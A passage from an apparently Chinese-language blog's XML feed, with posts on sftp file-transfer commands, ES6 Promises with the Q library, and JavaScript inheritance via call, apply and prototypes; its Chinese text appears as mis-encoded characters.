class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put localFile</span><br></pre></td></tr></table></figure><h4 id="ä¸Šä¼ æ–‡ä»¶å¤¹"><a href="#ä¸Šä¼ æ–‡ä»¶å¤¹" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶å¤¹"></a>ä¸Šä¼ æ–‡ä»¶å¤¹</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put -r localDir</span><br></pre></td></tr></table></figure><h4 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h4><p>ä¸‹è½½å‘½ä»¤ä¸ºï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get remoteFile</span><br></pre></td></tr></table></figure><h4 id="é‡å‘½å"><a href="#é‡å‘½å" class="headerlink" title="é‡å‘½å"></a>é‡å‘½å</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get remoteFile localName</span><br></pre></td></tr></table></figure><h4 id="ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™"><a href="#ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™" class="headerlink" title="ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™"></a>ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get -Pr remoteFile</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server" target="_blank" rel="noopener">How To Use SFTP to Securely Transfer Files with a Remote Server</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä½¿ç”¨ &lt;strong&gt;sftp&lt;/strong&gt; ä¸æœåŠ¡å™¨è¿›è¡Œæ–‡ä»¶ä¼ è¾“æ¯” &lt;strong&gt;ftp&lt;/strong&gt; è¦å®‰å…¨ã€‚&lt;/p&gt;
&lt;h4 id=&quot;ç™»é™†&quot;&gt;&lt;a href=&quot;#ç™»é™†&quot; class=&quot;headerlink&quot; title=&quot;ç™»é™†&quot;&gt;&lt;/a&gt;ç™»é™†&lt;/h4&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sftp username@remote_hostname_or_IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://youngdze.co/categories/Linux/"/>
    
    
      <category term="sftp" scheme="http://youngdze.co/tags/sftp/"/>
    
  </entry>
  
  <entry>
    <title>ECMAScript6 Promise</title>
    <link href="http://youngdze.co/2015/09/08/ecmascript6-promise/"/>
    <id>http://youngdze.co/2015/09/08/ecmascript6-promise/</id>
    <published>2015-09-08T03:07:25.000Z</published>
    <updated>2016-12-05T11:43:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Promise-è§£é‡Š"><a href="#Promise-è§£é‡Š" class="headerlink" title="Promise è§£é‡Š"></a><em>Promise</em> è§£é‡Š</h4><blockquote><p>The Promise object is used for deferred and asynchronous computations.</p></blockquote><a id="more"></a><h4 id="Promise-è¯­æ³•"><a href="#Promise-è¯­æ³•" class="headerlink" title="Promise è¯­æ³•"></a><em>Promise</em> è¯­æ³•</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(executor);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123; ... &#125;);</span><br></pre></td></tr></table></figure><h4 id="Promise-ç»“æ„"><a href="#Promise-ç»“æ„" class="headerlink" title="Promise ç»“æ„"></a><em>Promise</em> ç»“æ„</h4><h5 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;&#125;);</span><br></pre></td></tr></table></figure><p><strong>resolve(thenable)</strong></p><p>Your promise will be fulfilled/rejected with the outcome of thenable</p><p><strong>resolve(obj)</strong></p><p>Your promise is fulfilled with obj</p><p><strong>reject(obj)</strong></p><p>Your promise is rejected with obj. For consistency and debugging (eg stack traces), obj should be an instanceof Error. Any errors thrown in the constructor callback will be implicitly passed to reject(). Instance Methods</p><p><strong>promise.then(onFulfilled, onRejected)</strong></p><p>onFulfilled is called when/if â€œpromiseâ€ resolves. onRejected is called when/if â€œpromiseâ€ rejects. Both are optional, if either/both are omitted the next onFulfilled/onRejected in the chain is called. Both callbacks have a single parameter, the fulfillment value or rejection reason. â€œthenâ€ returns a new promise equivalent to the value you return from onFulfilled/onRejected after being passed through Promise.resolve. If an error is thrown in the callback, the returned promise rejects with that error.</p><p><strong>promise.catch(onRejected)</strong></p><p>Sugar for promise.then(undefined, onRejected)</p><h5 id="ç®€å•ä¾‹å­"><a href="#ç®€å•ä¾‹å­" class="headerlink" title="ç®€å•ä¾‹å­"></a>ç®€å•ä¾‹å­</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    resolve(<span class="string">'Stuff worked!'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(<span class="string">'It broke'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="æ¥å—å‚æ•°çš„ä¾‹å­"><a href="#æ¥å—å‚æ•°çš„ä¾‹å­" class="headerlink" title="æ¥å—å‚æ•°çš„ä¾‹å­"></a>æ¥å—å‚æ•°çš„ä¾‹å­</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) reject(err);</span><br><span class="line">        resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="è¿˜å¯ä»¥ç”¨-Promise-catch-æ•è·é”™è¯¯"><a href="#è¿˜å¯ä»¥ç”¨-Promise-catch-æ•è·é”™è¯¯" class="headerlink" title="è¿˜å¯ä»¥ç”¨ Promise.catch() æ•è·é”™è¯¯"></a>è¿˜å¯ä»¥ç”¨ <code>Promise.catch()</code> æ•è·é”™è¯¯</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) reject(err);</span><br><span class="line">        resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="é“¾å¼è¯·æ±‚"><a href="#é“¾å¼è¯·æ±‚" class="headerlink" title="é“¾å¼è¯·æ±‚"></a>é“¾å¼è¯·æ±‚</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;).then(<span class="literal">undefined</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="å¼‚æ­¥è¯·æ±‚ä¾‹å­"><a href="#å¼‚æ­¥è¯·æ±‚ä¾‹å­" class="headerlink" title="å¼‚æ­¥è¯·æ±‚ä¾‹å­"></a>å¼‚æ­¥è¯·æ±‚ä¾‹å­</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Return a new promise.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Do the usual XHR stuff</span></span><br><span class="line">    <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    req.open(<span class="string">'GET'</span>, url);</span><br><span class="line"></span><br><span class="line">    req.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// This is called even on 404 etc</span></span><br><span class="line">        <span class="comment">// so check the status</span></span><br><span class="line">        <span class="keyword">if</span> (req.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="comment">// Resolve the promise with the response text</span></span><br><span class="line">        resolve(req.response);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Otherwise reject with the status text</span></span><br><span class="line">        <span class="comment">// which will hopefully be a meaningful error</span></span><br><span class="line">        reject(<span class="built_in">Error</span>(req.statusText));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle network errors</span></span><br><span class="line">    req.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        reject(<span class="built_in">Error</span>(<span class="string">"Network Error"</span>));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the request</span></span><br><span class="line">    req.send();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get(<span class="string">'story.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Success!"</span>, response);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">"Failed!"</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h4><p>_Q_ æŒ‡çš„æ˜¯ <a href="https://github.com/kriskowal/q" target="_blank" rel="noopener">kriskowal/q</a>ï¼Œä¸€ä¸ªæä¾› <strong>Promise</strong> ç‰¹æ€§çš„ç»„ä»¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> Q = <span class="built_in">require</span>(<span class="string">'q'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = Q.defer();</span><br><span class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) d.reject(err);</span><br><span class="line">    d.resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> d.promise;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get(<span class="string">'es6.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> data.length;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Promise-è§£é‡Š&quot;&gt;&lt;a href=&quot;#Promise-è§£é‡Š&quot; class=&quot;headerlink&quot; title=&quot;Promise è§£é‡Š&quot;&gt;&lt;/a&gt;&lt;em&gt;Promise&lt;/em&gt; è§£é‡Š&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;The Promise object is used for deferred and asynchronous computations.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Promise" scheme="http://youngdze.co/tags/Promise/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript ç»§æ‰¿</title>
    <link href="http://youngdze.co/2015/09/07/javascript-inheritance/"/>
    <id>http://youngdze.co/2015/09/07/javascript-inheritance/</id>
    <published>2015-09-07T15:53:09.000Z</published>
    <updated>2017-02-06T11:21:46.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="call-amp-apply"><a href="#call-amp-apply" class="headerlink" title="call &amp; apply"></a>call &amp; apply</h3><p><code>call</code> å’Œ <code>apply</code> ä½œç”¨åŸºæœ¬ç›¸åŒï¼Œéƒ½å¯ä»¥è®©ä¸€ä¸ªå¯¹è±¡å¼•ç”¨å¦ä¸€ä¸ªå¯¹è±¡æˆ–å®ƒçš„æ–¹æ³•ï¼Œä¸¤è€…å”¯ä¸€çš„<a href="http://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply" target="_blank" rel="noopener">ä¸åŒ</a>æ˜¯ <code>call</code> æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªä¸ªåˆ—å‡ºæ¥ï¼Œ<code>apply</code> æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ <a id="more"></a></p><p><code>call</code> çš„<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call" target="_blank" rel="noopener">å®šä¹‰</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun.call(thisArg[, arg1[, arg2[, ...]]])</span><br></pre></td></tr></table></figure><p><code>apply</code> çš„<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/apply" target="_blank" rel="noopener">å®šä¹‰</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun.apply(thisArg, [argsArray])</span><br></pre></td></tr></table></figure><h4 id="call-çš„ç»§æ‰¿"><a href="#call-çš„ç»§æ‰¿" class="headerlink" title="call çš„ç»§æ‰¿"></a><code>call</code> çš„ç»§æ‰¿</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    Animal.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">"Black Cat"</span>);</span><br><span class="line">cat.showName();</span><br></pre></td></tr></table></figure><h4 id="apply-çš„ç»§æ‰¿"><a href="#apply-çš„ç»§æ‰¿" class="headerlink" title="apply çš„ç»§æ‰¿"></a><code>apply</code> çš„ç»§æ‰¿</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.showSub = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">        alert(a-b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.showAdd = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">        alert(a+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Class10.apply(<span class="keyword">this</span>);</span><br><span class="line">    Class11.apply(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>call</code> å’Œ <code>apply</code> çš„ç»§æ‰¿æ–¹æ³•éƒ½ä¸èƒ½ç»§æ‰¿åŸå‹é“¾ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Animal.prototype.say = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    Animal.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">"Black Cat"</span>);</span><br><span class="line">cat.say();    <span class="comment">// Uncaught TypeError: cat.say is not a function</span></span><br></pre></td></tr></table></figure><h3 id="åŸå‹ç»§æ‰¿"><a href="#åŸå‹ç»§æ‰¿" class="headerlink" title="åŸå‹ç»§æ‰¿"></a>åŸå‹ç»§æ‰¿</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Mammal = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Mammal.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name + <span class="string">"!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Cat = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Cat.prototype = <span class="keyword">new</span> Mammal();</span><br><span class="line">Cat.prototype.constructor = Cat;       <span class="comment">// å¦åˆ™ Cat çš„å®ä¾‹çš„æ„é€ å‡½æ•°å°†ä¼šæ˜¯ Mammal çš„æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">'Garfield'</span>);</span><br><span class="line">cat.greeting();</span><br></pre></td></tr></table></figure><p>å¤æ‚ç‚¹ä¾‹å­ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mammal</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.offspring = [];</span><br><span class="line">&#125;</span><br><span class="line">Mammal.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newBaby = <span class="keyword">new</span> Mammal(<span class="string">"Baby "</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    <span class="keyword">this</span>.offspring.push(newBaby);</span><br><span class="line">    <span class="keyword">return</span> newBaby;</span><br><span class="line">&#125;</span><br><span class="line">Mammal.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'[Mammal "'</span> + <span class="keyword">this</span>.name + <span class="string">'"]'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Cat.prototype = <span class="keyword">new</span> Mammal();</span><br><span class="line">Cat.prototype.constructor = Cat;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Cat.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'[Cat "'</span> + <span class="keyword">this</span>.name + <span class="string">'"]'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>haveABaby</code> ç»§æ‰¿è¿˜å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Mammal.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newBaby = <span class="keyword">new</span> <span class="keyword">this</span>.constructor(<span class="string">"Baby "</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    <span class="keyword">this</span>.offspring.push(newBaby);</span><br><span class="line">    <span class="keyword">return</span> newBaby;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œçš„ this.parent ç±»ä¼¼å…¸å‹ OO è¯­è¨€ä¸­çš„ super</span></span><br><span class="line">Cat.prototype.parent = 